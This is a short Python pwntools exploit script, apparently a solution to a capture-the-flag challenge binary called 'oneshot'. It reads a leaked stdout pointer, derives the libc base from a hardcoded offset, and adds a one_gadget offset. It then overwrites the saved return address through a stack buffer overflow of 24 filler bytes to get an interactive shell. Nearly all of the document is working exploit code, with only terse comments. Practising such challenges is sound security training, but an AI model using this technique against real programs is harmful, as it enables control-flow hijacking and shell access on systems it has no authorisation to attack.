
from pwn import *

p = process("./oneshot")
print(p.recvuntil("stdout: "))

# address of stdout pointer
stdout = p.recvuntil("\n").strip("\n")      
stdout = int(stdout, 16)       
print("stdout: " + hex(stdout))

# offset : p/x func_addr(gdb - print func) in lib - lib_addr(vmmap)
# library base : func_addr - offset
libc_base = stdout - 0x3ec760
# gadget : libc_base + one_gadget_addr
oneshot = libc_base + 0x4f2a5

# Stack Bufferoverflow
payload = b"A"*24 #buf(16byte) + SFP(8byte)
payload += p64(oneshot)
p.send(payload)

p.interactive()
